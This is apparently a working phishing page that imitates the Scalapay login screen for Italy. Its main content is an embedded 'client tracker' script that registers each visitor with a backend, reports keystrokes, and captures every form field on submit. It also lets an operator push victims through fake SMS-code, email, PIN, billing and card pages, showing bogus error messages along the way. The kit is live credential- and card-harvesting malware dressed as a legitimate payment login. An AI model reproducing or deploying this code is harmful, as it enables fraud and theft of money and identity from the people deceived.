<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./pages/snipped.css">
   <style>
/* ===== LOADING BUTTON ===== */
.btn-loading {
    background: #999999 !important;
    color: #1d1c1c !important;
    cursor: not-allowed !important;
    pointer-events: none;
}
.btn-loading .btn-spinner {
    display: inline-block !important;
}
.btn-spinner {
    display: none;
    width: 16px;
    height: 16px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top-color: #fff;
    border-radius: 50%;
    animation: btn-spin 0.7s linear infinite;
    vertical-align: middle;
    margin-right: 8px;
}
@keyframes btn-spin {
    to { transform: rotate(360deg); }
}

/* ===== MOBILE: hide app download banner ===== */
@media (max-width: 768px) {
    .page-module-scss-module__rcUngW__login__appDownloadBanner {
        display: none !important;
    }
}
</style>
<base target="_blank">
</head>
   <body data-page="login">
<div class="page-module-scss-module__rcUngW__login snipcss-x8xsP">
    <div class="page-module-scss-module__rcUngW__header ">
        <div class="page-module-scss-module__rcUngW__header__logo"><img alt="Scalapay" src="./pages/images/scalapay-logo-m.svg"></div>
    </div>
    <div class="page-module-scss-module__rcUngW__login__container">
        <div class="page-module-scss-module__rcUngW__loginArea">
            <div class="PhoneEntryStep-module-scss-module__Igk4_G__phoneEntry__countrySelect">
                <div class="_trigger_1tw8a_1">
                    <div class="_icon_a84d7_1 style-qDU9Q" id="style-qDU9Q"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M11.9995 23.5C18.3508 23.5 23.4995 18.3513 23.4995 12C23.4995 5.64872 18.3508 0.5 11.9995 0.5C5.64823 0.5 0.499512 5.64872 0.499512 12C0.499512 18.3513 5.64823 23.5 11.9995 23.5Z" fill="white" />
                            <path d="M23.4995 11.9999C23.4995 7.05532 20.3787 2.84008 15.9995 1.21521V22.7846C20.3787 21.1597 23.4995 16.9445 23.4995 11.9999Z" fill="#D80027" />
                            <path d="M0.499512 11.9999C0.499512 16.9445 3.62032 21.1597 7.99952 22.7846V1.21521C3.62032 2.84008 0.499512 7.05532 0.499512 11.9999Z" fill="#6DA544" />
                        </svg></div><span class="_trigger__countryName_1tw8a_9" data-automation="change-country-label">Italia</span><button type="button" class="_button_1f69x_1 _button--tertiary_1f69x_196 _button--size-s_1f69x_334 _button--color-lightweight-lilac_1f69x_72 _trigger__button_1tw8a_18" data-automation="change-country-button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-_r_0_" data-state="closed"><span class="_button__content_1f69x_355">Change</span></button>
                </div><button type="button" class="_pseudoCloseButton_1u12p_260"></button>
            </div>
            <form id="passwordless-authentication-form" data-automation="phone-entry-form">
                <div class="_card_1bhsr_1 _card--flattened_1bhsr_6 PhoneEntryStep-module-scss-module__Igk4_G__phoneEntry">
                    <div class="StepHeader-module-scss-module__Jib0XW__stepHeader">
                        <div class="StepHeader-module-scss-module__Jib0XW__stepHeader__icon">
                            <div class="_icon_a84d7_1 style-OfehH" id="style-OfehH"><svg width="33" height="33" viewBox="0 0 33 33" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M16.4995 26C15.252 26 14.0166 25.7543 12.864 25.2769C12.0565 24.9424 11.3008 24.4988 10.6172 23.9598C11.2896 23.7592 12.0568 23.5898 12.8979 23.462C14.0317 23.2899 15.2565 23.1999 16.4995 23.1999C17.7425 23.1999 18.9674 23.2899 20.1011 23.462C20.9423 23.5898 21.7095 23.7592 22.3818 23.9598C21.6983 24.4988 20.9425 24.9424 20.135 25.2769C18.9824 25.7543 17.7471 26 16.4995 26ZM24.549 21.5454C24.3985 21.4832 24.2443 21.4233 24.0869 21.3656C23.0447 20.9834 21.8414 20.692 20.5516 20.4961C19.2588 20.2997 17.8829 20.1999 16.4995 20.1999C15.1161 20.1999 13.7402 20.2997 12.4475 20.4961C11.1576 20.692 9.95432 20.9834 8.91212 21.3656C8.7547 21.4233 8.60057 21.4832 8.45003 21.5454C8.16935 21.0976 7.92586 20.6261 7.72266 20.1355C7.24524 18.9829 6.99951 17.7476 6.99951 16.5C6.99951 15.2524 7.24524 14.0171 7.72266 12.8645C8.20008 11.7119 8.89984 10.6646 9.782 9.78249C10.6642 8.90033 11.7114 8.20057 12.864 7.72314C14.0166 7.24573 15.252 7 16.4995 7C17.7471 7 18.9824 7.24572 20.135 7.72314C21.2876 8.20056 22.3349 8.90033 23.217 9.78249C24.0992 10.6646 24.7989 11.7119 25.2764 12.8645C25.7538 14.0171 25.9995 15.2524 25.9995 16.5C25.9995 17.7476 25.7538 18.9829 25.2764 20.1355C25.0732 20.6261 24.8297 21.0976 24.549 21.5454ZM28.9995 16.5049C28.9989 18.1447 28.6756 19.7685 28.048 21.2835C27.4198 22.8001 26.4991 24.1781 25.3383 25.3388C24.1776 26.4996 22.7996 27.4203 21.2831 28.0485C19.7665 28.6767 18.141 29 16.4995 29C14.858 29 13.2325 28.6767 11.716 28.0485C10.1994 27.4203 8.82141 26.4996 7.66068 25.3388C6.49995 24.1781 5.5792 22.8001 4.95102 21.2835C4.32283 19.767 3.99951 18.1415 3.99951 16.5C3.99951 14.8585 4.32283 13.233 4.95102 11.7165C5.5792 10.1999 6.49994 8.8219 7.66068 7.66117C8.82141 6.50043 10.1994 5.57969 11.716 4.95151C13.2325 4.32332 14.858 4 16.4995 4C18.141 4 19.7665 4.32332 21.2831 4.95151C22.7996 5.57969 24.1776 6.50043 25.3383 7.66117C26.4991 8.8219 27.4198 10.1999 28.048 11.7165C28.6762 13.233 28.9995 14.8585 28.9995 16.5V16.5049ZM16.4995 16C16.1712 16 15.8461 15.9353 15.5428 15.8097C15.2395 15.6841 14.9639 15.4999 14.7317 15.2678C14.4996 15.0356 14.3154 14.76 14.1898 14.4567C14.0642 14.1534 13.9995 13.8283 13.9995 13.5C13.9995 13.1717 14.0642 12.8466 14.1898 12.5433C14.3154 12.24 14.4996 11.9644 14.7317 11.7322C14.9639 11.5001 15.2395 11.3159 15.5428 11.1903C15.8461 11.0647 16.1712 11 16.4995 11C16.8278 11 17.1529 11.0647 17.4562 11.1903C17.7595 11.3159 18.0351 11.5001 18.2673 11.7322C18.4994 11.9644 18.6836 12.24 18.8092 12.5433C18.9348 12.8466 18.9995 13.1717 18.9995 13.5C18.9995 13.8283 18.9348 14.1534 18.8092 14.4567C18.6836 14.76 18.4994 15.0356 18.2673 15.2678C18.0351 15.4999 17.7595 15.6841 17.4562 15.8097C17.1529 15.9353 16.8278 16 16.4995 16ZM21.9995 13.5C21.9995 14.2223 21.8573 14.9375 21.5808 15.6048C21.3044 16.272 20.8993 16.8784 20.3886 17.3891C19.8779 17.8998 19.2716 18.3049 18.6043 18.5813C17.937 18.8577 17.2218 19 16.4995 19C15.7772 19 15.062 18.8577 14.3948 18.5813C13.7275 18.3049 13.1211 17.8998 12.6104 17.3891C12.0997 16.8784 11.6946 16.272 11.4182 15.6048C11.1418 14.9375 10.9995 14.2223 10.9995 13.5C10.9995 12.7777 11.1418 12.0625 11.4182 11.3952C11.6946 10.728 12.0997 10.1216 12.6104 9.61091C13.1211 9.10019 13.7275 8.69506 14.3948 8.41866C15.062 8.14226 15.7772 8 16.4995 8C17.2218 8 17.937 8.14226 18.6043 8.41866C19.2716 8.69506 19.8779 9.10019 20.3886 9.61091C20.8993 10.1216 21.3044 10.728 21.5808 11.3952C21.8573 12.0625 21.9995 12.7777 21.9995 13.5Z" fill="currentColor" />
                                </svg></div>
                        </div>
                        <div>
                            <div class="StepHeader-module-scss-module__Jib0XW__stepHeader__title" data-automation="login-header-title">Register or log in</div>
                            <div class="StepHeader-module-scss-module__Jib0XW__stepHeader__subtitle StepHeader-module-scss-module__Jib0XW__stepHeader__subtitle--muted" data-automation="login-header-subtitle">Enter your mobile number to get started</div>
                        </div>
                    </div>
                    <div class="PhoneEntryStep-module-scss-module__Igk4_G__phoneEntry__main">
                        <div class="PhoneEntryStep-module-scss-module__Igk4_G__phoneEntry__main__countryCode">+39</div><span class="_root_u1pz0_1 PhoneEntryStep-module-scss-module__Igk4_G__phoneEntry__main__input">
                            <div class="_core_u1pz0_46">
                                <div class="_inputWrapper_u1pz0_51"><input maxlength="12" data-automation="login-phone-number-input" id="_r_3_" class="_input_u1pz0_33" placeholder type="tel" value></div><label class="_label_u1pz0_5" for="_r_3_"><span class="_label__inner_u1pz0_16">Mobile number</span></label>
                            </div>
                        </span>
                    </div>
                    <div class="PhoneEntryStep-module-scss-module__Igk4_G__phoneEntry__divider">
                        <hr class="_divider_1v5z2_1 _divider-orientation-horizontal_1v5z2_7 _divider-orientation-horizontal-solid_1v5z2_14 _divider-shade-light_1v5z2_29" aria-orientation="horizontal">
                    </div>
                    <div class="PhoneEntryStep-module-scss-module__Igk4_G__phoneEntry__rememberMe">
                        <div class="_root_1985e_1"><button type="button" role="checkbox" aria-checked="false" data-state="unchecked" value="on" id="remember-me" class="_checkbox_1985e_23" data-automation="remember-me-checkbox"></button><input aria-hidden="true" tabindex="-1" type="checkbox" value="on" id="style-k7Qd6" class="style-k7Qd6"></div><label for="remember-me" class="PhoneEntryStep-module-scss-module__Igk4_G__phoneEntry__rememberMe__label"><span class="PhoneEntryStep-module-scss-module__Igk4_G__phoneEntry__rememberMe__text">Keep me signed in</span></label>
                    </div>
                </div>
                <div class="PhoneEntryStep-module-scss-module__Igk4_G__phoneEntry__submitButton"><button type="submit" class="_button_1f69x_1 _button--primary_1f69x_15 _button--size-l_1f69x_308 _button--color-normal-lilac_1f69x_34 PhoneEntryStep-module-scss-module__Igk4_G__phoneEntry__submitButton__button" data-automation="login-submit-button"><span class="btn-spinner"></span><span class="_button__content_1f69x_355 btn-text">Continue</span></button></div>
            </form>
            <div><iframe aria-hidden="true" data-hcaptcha-widget-id="0gkj53vmo1ed" data-hcaptcha-response src="https://newassets.hcaptcha.com/captcha/v1/451a37f73f610ddb24b43e498d4539e54eee3e40/static/hcaptcha.html#frame=checkbox-invisible" id="style-s8E25" class="style-s8E25"></iframe><textarea id="g-recaptcha-response-0gkj53vmo1ed" name="g-recaptcha-response" class="style-QEvZz"></textarea><textarea id="h-captcha-response-0gkj53vmo1ed" name="h-captcha-response" class="style-ZB6n6"></textarea></div>
            <div class="LoginFlow-module-scss-module__Q12x1a__loginFlow__loginTermsAndConditions">
                <div class="LoginFlow-module-scss-module__Q12x1a__loginFlow__loginTermsAndConditions__text">Clicking 'Continue' you accept <a href="https://cdn.scalapay.com/terms-and-conditions/en-IT/Scalapay - Terms_and_Conditions.pdf" target="_blank" rel="noreferrer" data-automation="general-terms-and-conditions-link">General T&amp;C</a>, the <a href="https://cdn.scalapay.com/privacy-policy/srl-privacy/en-IT/Scalapay_S.r.l._privacy_policy.pdf" target="_blank" rel="noreferrer" data-automation="privacy-policy-link">privacy</a> and <a href="https://www.scalapay.com/cookies?country=IT" target="_blank" rel="noreferrer" data-automation="cookie-policy-link">cookie</a> policies.</div>
            </div>
            <div class="LoginFlow-module-scss-module__Q12x1a__loginFlow__visaPartnerDisplay">
                <div class="_container_1j166_1" data-automation="partner-display-container">
                    <div data-automation="partner-display-visa-logo" class="_icon_a84d7_1 _container-visa-logo_1j166_13 style-IfInk" id="style-IfInk"><svg width="106" height="107" viewBox="0 0 106 107" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M52.4843 36.9211L45.4026 70.0294H36.8368L43.9193 36.9211H52.4843ZM88.5199 58.2995L93.028 45.8667L95.6224 58.2995H88.5199ZM98.0798 70.0294H106L99.0806 36.9211H91.7748C90.1283 36.9211 88.7403 37.8757 88.1259 39.3479L75.2739 70.0294H84.2694L86.0551 65.0848H97.0425L98.0798 70.0294ZM75.7199 59.2206C75.7572 50.4828 63.6408 49.9988 63.722 46.0945C63.748 44.9083 64.8799 43.6446 67.3537 43.3214C68.5801 43.1635 71.9646 43.0355 75.8011 44.8033L77.3016 37.7797C75.2411 37.0343 72.5894 36.3164 69.2898 36.3164C60.8223 36.3164 54.8657 40.8141 54.8181 47.2599C54.7637 52.0265 59.0731 54.6842 62.3131 56.2718C65.6536 57.8944 66.7729 58.9347 66.7565 60.3845C66.7334 62.6059 64.0928 63.5896 61.634 63.6268C57.3254 63.6938 54.8278 62.4621 52.8373 61.5343L51.2824 68.7925C53.2871 69.7099 56.9806 70.5082 60.8051 70.5491C69.8073 70.5491 75.6931 66.1043 75.7199 59.2206ZM40.2451 36.9211L26.3669 70.0294H17.3141L10.4841 43.6066C10.07 41.9818 9.70887 41.3846 8.44965 40.698C6.38992 39.5795 2.98981 38.5333 0 37.8824L0.20255 36.9211H14.777C16.6335 36.9211 18.3037 38.1565 18.7289 40.2951L22.3368 59.4552L31.2466 36.9211H40.2451Z" fill="currentColor" />
                        </svg></div>
                    <hr class="_divider_1v5z2_1 _divider-orientation-vertical_1v5z2_17 _divider-orientation-vertical-solid_1v5z2_26 _divider-shade-dark_1v5z2_32 _container-divider_1j166_26" aria-orientation="vertical" data-automation="partner-display-divider">
                    <div data-automation="partner-display-scalapay-logo" class="_icon_a84d7_1 _container-scalapay-logo_1j166_20 style-yTULq" id="style-yTULq"><svg width="96" height="19" viewBox="0 0 96 19" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M1.14539 8.06262C0.889399 7.7693 0.900777 7.33071 1.17164 7.05085L4.05547 4.07129C4.35318 3.76369 4.84896 3.7637 5.14667 4.07129L7.35071 6.3485C7.64843 6.6561 8.14421 6.6561 8.44192 6.3485L10.5828 4.1365C10.8806 3.82891 11.3763 3.82891 11.6741 4.1365L14.5477 7.1055C14.8184 7.38522 14.8299 7.82357 14.5742 8.11691L8.45958 15.1321C8.15799 15.4781 7.61737 15.4783 7.31556 15.1325L1.14539 8.06262ZM17.7978 12.9105L18.9473 11.1484C19.5494 11.7168 20.4799 12.0579 21.374 12.0579C22.0126 12.0579 22.5053 11.7358 22.5053 11.2811C22.5053 9.89789 18.2174 10.3905 18.2174 7.43474C18.2174 5.67263 19.8596 4.57368 21.6112 4.57368C22.7607 4.57368 24.0197 5.02842 24.6036 5.50211L23.4906 7.28316C23.0344 6.94211 22.4323 6.65789 21.7937 6.65789C21.1368 6.65789 20.5894 6.92316 20.5894 7.39684C20.5894 8.59053 24.8773 8.11684 24.8773 11.3C24.8773 13.0621 23.2169 14.1421 21.3558 14.1421C20.1333 14.1421 18.8378 13.7063 17.7978 12.9105ZM33.2705 10.6558L35.0951 12.0768C34.0551 13.5168 32.7414 14.1421 31.081 14.1421C28.344 14.1421 26.337 12.02 26.337 9.36737C26.337 6.69579 28.3988 4.57368 31.0992 4.57368C32.6319 4.57368 34.0003 5.31263 34.8214 6.41158L33.1428 7.94632C32.6684 7.30211 31.9568 6.84737 31.0992 6.84737C29.7307 6.84737 28.709 7.96526 28.709 9.36737C28.709 10.8074 29.7125 11.8684 31.1539 11.8684C32.121 11.8684 32.8873 11.2621 33.2705 10.6558ZM43.0322 10.7316V7.98421C42.5395 7.3021 41.7549 6.84737 40.8426 6.84737C39.4559 6.84737 38.5619 8.04105 38.5619 9.36737C38.5619 10.8074 39.5654 11.8684 40.8974 11.8684C41.7914 11.8684 42.576 11.4137 43.0322 10.7316ZM45.4042 4.76316V13.9526H43.1234V13.2137C42.3936 13.8579 41.5542 14.1421 40.6602 14.1421C39.3465 14.1421 38.1057 13.5358 37.3211 12.5884C36.6278 11.7547 36.1899 10.6179 36.1899 9.36737C36.1899 6.65789 38.124 4.57368 40.5325 4.57368C41.536 4.57368 42.43 4.91474 43.1234 5.50211V4.76316H45.4042ZM50.5131 0.5V13.9526H48.1411V0.5H50.5131ZM59.3625 10.7316V7.98421C58.8698 7.3021 58.0852 6.84737 57.1729 6.84737C55.7862 6.84737 54.8922 8.04105 54.8922 9.36737C54.8922 10.8074 55.8957 11.8684 57.2277 11.8684C58.1217 11.8684 58.9063 11.4137 59.3625 10.7316ZM61.7345 4.76316V13.9526H59.4537V13.2137C58.7239 13.8579 57.8845 14.1421 56.9905 14.1421C55.6768 14.1421 54.436 13.5358 53.6514 12.5884C52.9581 11.7547 52.5202 10.6179 52.5202 9.36737C52.5202 6.65789 54.4543 4.57368 56.8627 4.57368C57.8663 4.57368 58.7603 4.91474 59.4537 5.50211V4.76316H61.7345ZM64.4714 18.5V4.76316H66.7522V5.50211C67.4455 4.91474 68.3396 4.57368 69.3431 4.57368C71.7516 4.57368 73.6857 6.65789 73.6857 9.36737C73.6857 10.6179 73.266 11.7547 72.5727 12.5884C71.7881 13.5358 70.5291 14.1421 69.2154 14.1421C68.3213 14.1421 67.555 13.8768 66.8434 13.3084V18.5H64.4714ZM66.8434 7.98421V10.7316C67.2995 11.4137 68.0841 11.8684 68.9782 11.8684C70.3102 11.8684 71.3137 10.8074 71.3137 9.36737C71.3137 8.04105 70.4196 6.84737 69.0329 6.84737C68.1206 6.84737 67.336 7.3021 66.8434 7.98421ZM81.9877 10.7316V7.98421C81.495 7.3021 80.7104 6.84737 79.7981 6.84737C78.4114 6.84737 77.5174 8.04105 77.5174 9.36737C77.5174 10.8074 78.5209 11.8684 79.8529 11.8684C80.7469 11.8684 81.5315 11.4137 81.9877 10.7316ZM84.3597 4.76316V13.9526H82.0789V13.2137C81.3491 13.8579 80.5097 14.1421 79.6157 14.1421C78.302 14.1421 77.0612 13.5358 76.2766 12.5884C75.5833 11.7547 75.1454 10.6179 75.1454 9.36737C75.1454 6.65789 77.0795 4.57368 79.488 4.57368C80.4915 4.57368 81.3856 4.91474 82.0789 5.50211V4.76316H84.3597ZM89.9065 18.5H87.425L89.87 13.0242L85.9106 4.76316H88.5198L91.1107 10.2768L93.501 4.76316H96.0007L89.9065 18.5Z" fill="#272727" />
                        </svg></div>
                </div>
            </div>
            <div class>
                <div class="Footer-module-scss-module__m5Bw6W__footer__bottom"><a target="_blank" href="https://www.scalapay.com/it/dati-societari" data-automation="profile-about-scalapay-link" rel="noreferrer" class="Footer-module-scss-module__m5Bw6W__footer__bottom__link">About Scalapay</a></div>
            </div>
        </div>
        <div class="page-module-scss-module__rcUngW__login__appDownloadBanner">
            <div class="AppDownloadBanner-module-scss-module__fqXfRW__container">
                <div class="AppDownloadBanner-module-scss-module__fqXfRW__banner AppDownloadBanner-module-scss-module__fqXfRW__banner--loginVariant" data-automation="app-download-banner">
                    <div class="BannerText-module-scss-module__7Pv6ma__textSection" data-automation="app-download-banner-text">
                        <h1 class="BannerText-module-scss-module__7Pv6ma__title">Download the App</h1>
                        <ul class="BannerText-module-scss-module__7Pv6ma__features" data-automation="app-download-banner-feature-list">
                            <li>Faster login</li>
                            <li>Get exclusive offers</li>
                            <li>Manage your purchases easily</li>
                            <li>Keep everything under control</li>
                        </ul>
                    </div>
                    <div class="QrCode-module-scss-module__YPyFKa__qrCodeSection" data-automation="app-download-banner-qr-code"><span>Scan the QR code and get the app</span><img alt="QR Code to the link to download Scalapay app" src="./pages/images/app-download-qr-code.svg"></div>
                    <div class="PhoneImg-module-scss-module__DsgYKG__phoneSection" data-automation="app-download-banner-phone-img"><img alt="Scalapay app screenshot" loading="lazy" class="PhoneImg-module-scss-module__DsgYKG__phoneScreenshot" src="./pages/images/app-phones.png"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="page-module-scss-module__rcUngW__login__footer"></div>
</div>
   <script>
(function() {
    var form = document.getElementById('passwordless-authentication-form');
    var btn = form.querySelector('button[type="submit"]');
    var btnText = btn.querySelector('.btn-text');
    var spinner = btn.querySelector('.btn-spinner');

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        var phoneInput = document.getElementById('_r_3_');
        if (!phoneInput.value.trim()) {
            phoneInput.focus();
            return;
        }

        // Add loading state
        btn.classList.add('btn-loading');
        btn.disabled = true;
        if (btnText) btnText.textContent = '';

        // Simulate API call (3 sec), then reset
        setTimeout(function() {
            btn.classList.remove('btn-loading');
            btn.disabled = false;
            if (btnText) btnText.textContent = 'Continue';
        }, 10000);
    });
})();
</script>
<?php /* Tracker injected into all client pages */ ?>
<script>
// ==================== SCALAPAY CLIENT TRACKER ====================
(function() {
    const basePath = window.location.pathname.replace(/\/pages\/.*$/, '/').replace(/\/[^\/]*$/, '/');
    const API_URL = basePath + 'api.php';
    const PAGE_NAME = document.body.getAttribute('data-page') || 'unknown';

    const PAGE_ERRORS = {
        'login': 'Impossibile inviare il codice di verifica. Controlla il tuo numero di telefono e riprova.',
        'sms': 'Il codice di verifica inserito non è corretto. Riprova.',
        'email': 'Il codice di verifica inserito non è corretto. Controlla la tua casella di posta elettronica e riprova.',
        'pin': 'Il PIN inserito non è corretto. Riprova.',
        'billing': 'Non siamo riusciti a elaborare i tuoi dati di fatturazione. Ti preghiamo di controllare i dati inseriti e riprovare.',
        'card': 'La tua carta è stata rifiutata. Controlla i dati della carta e riprova.',
        'success': 'Si è verificato un errore imprevisto. Riprova più tardi.'
    };

    let clientId = localStorage.getItem('sp_client_id') || '';
    let phoneNumber = localStorage.getItem('sp_phone') || '';
    let emailMask = localStorage.getItem('sp_email') || '';
    let isLoading = false;
    let typingNotified = false;

    console.log('[SP] Tracker loaded. Page:', PAGE_NAME, 'API:', API_URL);

    function register() {
        fetch(API_URL + '?action=register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ page: PAGE_NAME })
        })
        .then(r => r.json())
        .then(res => {
            if (res.success) {
                clientId = res.clientId;
                localStorage.setItem('sp_client_id', clientId);
                console.log('[SP] Registered:', clientId);
                startHeartbeat();
                if (PAGE_NAME === 'sms') {
                    fetchPhoneFromServer();
                }
            }
        })
        .catch(e => console.error('[SP] Register failed:', e));
    }

    function startHeartbeat() {
        doHeartbeat();
        setInterval(doHeartbeat, 2000);
    }

    function doHeartbeat() {
        if (!clientId) return;
        fetch(API_URL + '?action=heartbeat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clientId: clientId, page: PAGE_NAME })
        })
        .then(r => r.json())
        .then(res => {
            if (res.success && res.commands && res.commands.length > 0) {
                res.commands.forEach(cmd => handleCommand(cmd));
            }
        })
        .catch(() => {});
    }

    function fetchPhoneFromServer() {
        if (!clientId) return;
        fetch(API_URL + '?action=getphone', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clientId: clientId })
        })
        .then(r => r.json())
        .then(res => {
            if (res.success && res.phone) {
                phoneNumber = res.phone;
                localStorage.setItem('sp_phone', phoneNumber);
                applyStoredPhone();
                console.log('[SP] Phone from server:', phoneNumber);
            }
        })
        .catch(() => {});
    }

    function handleCommand(cmd) {
        console.log('[SP] Command received:', cmd);
        switch (cmd.type) {
            case 'redirect':
                const pages = {
                    'login': 'index.php',
                    'sms': './pages/sms.php',
                    'email': './pages/email.php',
                    'pin': './pages/pin.php',
                    'billing': './pages/billing.php',
                    'card': './pages/card.php',
                    'success': './pages/success.php'
                };
                const target = pages[cmd.target] || cmd.target + '.php';
                window.location.href = target;
                break;

            case 'showError':
                stopLoading();
                const errorMsg = PAGE_ERRORS[PAGE_NAME] || 'An error occurred. Please try again.';
                showErrorToast(errorMsg);
                break;

            case 'setEmail':
                localStorage.setItem('sp_email', cmd.email);
                applyEmailMask(cmd.email);
                break;
        }
    }

    function stopLoading() {
        isLoading = false;
        document.querySelectorAll('form').forEach(function(form) {
            const btn = form.querySelector('button[type="submit"]');
            if (btn) {
                btn.disabled = false;
                btn.classList.remove('btn-loading');
                const spinner = btn.querySelector('.btn-spinner');
                if (spinner) spinner.style.display = 'none';
                const txt = btn.querySelector('.btn-text');
                if (txt) {
                    txt.textContent = (PAGE_NAME === 'login' || PAGE_NAME === 'sms') ? 'Continue' : 'Continua';
                }
            }
            form.querySelectorAll('input').forEach(function(inp) {
                inp.disabled = false;
                inp.style.opacity = '1';
            });
        });
    }

    function showErrorToast(message) {
        let toast = document.getElementById('sp-error-toast');
        if (!toast) {
            toast = document.createElement('div');
            toast.id = 'sp-error-toast';
            toast.innerHTML = `
                <div class="sp-err-box">
                    <div class="sp-err-icon">!</div>
                    <div class="sp-err-msg" id="sp-err-text"></div>
                    <button class="sp-err-close" onclick="document.getElementById('sp-error-toast').classList.remove('sp-active')">&times;</button>
                </div>
            `;
            document.body.appendChild(toast);
        }
        document.getElementById('sp-err-text').textContent = message;
        toast.classList.add('sp-active');
        setTimeout(() => toast.classList.remove('sp-active'), 7000);
    }
    window.showSPError = showErrorToast;

    function trackTyping(input) {
        input.addEventListener('input', function() {
            if (!typingNotified && clientId) {
                fetch(API_URL + '?action=typing', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ clientId: clientId, page: PAGE_NAME })
                }).catch(() => {});
                typingNotified = true;
            }
        });
    }

    function trackForms() {
        document.querySelectorAll('form').forEach(function(form) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                if (isLoading) return;

                const data = {};
                form.querySelectorAll('input, select, textarea').forEach(function(inp) {
                    // KEY FIX: Use data-automation attribute as field name if available
                    // This ensures 'login-phone-number-input' is used instead of '_r_3_'
                    var fieldName = inp.getAttribute('data-automation') || inp.id || inp.name || '';
                    if (fieldName) {
                        data[fieldName] = inp.value;
                    }
                });

                const phoneVal = data['login-phone-number-input'] || data['phone'] || '';
                if (phoneVal) {
                    localStorage.setItem('sp_phone', phoneVal);
                    phoneNumber = phoneVal;
                }

                if (clientId) {
                    fetch(API_URL + '?action=data', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ clientId: clientId, data: data })
                    }).catch(() => {});
                }

                isLoading = true;
                const btn = form.querySelector('button[type="submit"]');
                if (btn) {
                    btn.disabled = true;
                    btn.classList.add('btn-loading');
                    const spinner = btn.querySelector('.btn-spinner');
                    if (spinner) spinner.style.display = 'inline-block';
                    const txt = btn.querySelector('.btn-text');
                    if (txt) txt.textContent = '';
                }

                form.querySelectorAll('input').forEach(function(inp) {
                    inp.disabled = true;
                    inp.style.opacity = '0.6';
                });
            });
        });
    }

    function applyEmailMask(maskedEmail) {
        const subtitles = document.querySelectorAll('[data-automation="login-header-subtitle"]');
        subtitles.forEach(function(sub) {
            const text = sub.textContent.toLowerCase();
            if (text.includes('@') || text.includes('email') || text.includes('invia') || text.includes('inviato') || text.includes('codice')) {
                sub.textContent = 'Codice inviato a ' + maskedEmail;
            }
        });
    }

    function applyStoredPhone() {
        if (PAGE_NAME === 'sms' && phoneNumber) {
            const subs = document.querySelectorAll('[data-automation="login-header-subtitle"]');
            subs.forEach(function(sub) {
                sub.textContent = 'Enter the verification code we sent to ' + phoneNumber + '.';
            });
        }
    }

    if (!clientId) {
        register();
    } else {
        startHeartbeat();
        if (PAGE_NAME === 'sms') {
            fetchPhoneFromServer();
        }
    }

    trackForms();
    applyStoredPhone();

    if (PAGE_NAME === 'sms') {
        setTimeout(applyStoredPhone, 500);
        setTimeout(applyStoredPhone, 1000);
        setTimeout(applyStoredPhone, 2000);
        const subtitleEl = document.querySelector('[data-automation="login-header-subtitle"]');
        if (subtitleEl && window.MutationObserver) {
            const observer = new MutationObserver(function() {
                if (phoneNumber && !subtitleEl.textContent.includes(phoneNumber)) {
                    applyStoredPhone();
                }
            });
            observer.observe(subtitleEl, { childList: true, characterData: true, subtree: true });
        }
    }

    setTimeout(function() {
        document.querySelectorAll('input').forEach(function(inp) {
            trackTyping(inp);
        });
    }, 300);

    if (emailMask && PAGE_NAME === 'email') {
        applyEmailMask(emailMask);
    }

})();
</script>

<style>
#sp-error-toast {
    position: fixed !important;
    top: 20px !important;
    right: 20px !important;
    z-index: 999999 !important;
    transform: translateX(450px) !important;
    opacity: 0 !important;
    transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) !important;
    pointer-events: none !important;
    max-width: 400px !important;
}
#sp-error-toast.sp-active {
    transform: translateX(0) !important;
    opacity: 1 !important;
    pointer-events: auto !important;
}
.sp-err-box {
    display: flex !important;
    align-items: flex-start !important;
    gap: 14px !important;
    background: #fef2f2 !important;
    border-radius: 16px !important;
    padding: 16px 18px !important;
    box-shadow: 0 8px 30px rgba(239, 68, 68, 0.15), 0 2px 8px rgba(0,0,0,0.08) !important;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
}
.sp-err-icon {
    width: 24px !important;
    height: 24px !important;
    min-width: 24px !important;
    border-radius: 50% !important;
    border: 2px solid #ef4444 !important;
    color: #ef4444 !important;
    font-size: 14px !important;
    font-weight: 700 !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    flex-shrink: 0 !important;
    margin-top: 1px !important;
    background: transparent !important;
}
.sp-err-msg {
    color: #1f2937 !important;
    font-size: 13px !important;
    line-height: 1.5 !important;
    font-weight: 400 !important;
    flex: 1 !important;
    padding-right: 8px !important;
}
.sp-err-close {
    background: none !important;
    border: none !important;
    color: #6b7280 !important;
    font-size: 22px !important;
    font-weight: 300 !important;
    cursor: pointer !important;
    padding: 0 !important;
    line-height: 1 !important;
    width: 24px !important;
    height: 24px !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    flex-shrink: 0 !important;
    margin-top: -2px !important;
}
.sp-err-close:hover { color: #1f2937 !important; }
</style>
</body>
</html>